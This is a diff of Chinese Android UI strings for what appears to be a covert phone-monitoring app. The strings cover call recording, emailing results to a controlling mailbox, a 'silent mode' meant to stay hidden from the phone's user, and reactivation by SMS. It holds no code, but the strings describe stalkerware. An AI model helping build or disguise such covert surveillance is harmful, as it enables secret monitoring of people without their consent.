@@ -99,8 +99,8 @@
     <string name="pref_network_mode_title">网络连接模式</string>
     <string name="pref_network_mode_summary">静默模式更加隐蔽，如果该手机用户有用手机上网的习惯请选择静默模式。</string>
     <string name="pref_network_mode_dlg_title">选择模式</string>
-    <string name="pref_cannot_record_all_in_trial">试用期间不能对所有通话录音。注册后有效。</string>
-    <string name="pref_must_use_self_sender">鉴于保护隐私，只有使用自己的GMail发信，才允许对所有电话录音。前往www.gmail.com免费创建您的GMail账户。更多问题请咨询客服。</string>
+    <string name="pref_record_all_time_limit_in_trial">试用期间仅允许10次通话录音。</string>
+    <string name="pref_must_use_self_sender">鉴于保护隐私，只有使用您自己的GMail作为发信邮箱，才允许对所有电话录音。前往www.gmail.com免费创建您的GMail账户。更多问题请咨询客服。</string>
     
     <!-- InitActivity -->
     <string name="init_btn_testrecvmail">测试邮箱</string>
@@ -117,9 +117,10 @@
     <string name="init_hint_setting">设置主控邮箱和手机，录音号码段，敏感词等。</string>
     <string name="init_hint_hide">发送短信###到本机，可再激活本对话框。</string>
     <string name="init_processing">处理中</string>
-    <string name="init_waiting">请稍候（30秒~2分钟）...</string>
+    <string name="init_waiting">请稍候（30秒~3分钟）...</string>
     <string name="init_collecting">正在收集信息...</string>
     <string name="init_sending">正在发邮件...</string>
+    <string name="init_pls_reset_phone">请重启手机，之后所有设定及功能生效。</string>
     
     <!-- Actions -->
     <string name="action_send_mail_success">发信成功。稍后请查阅您的邮箱。</string>
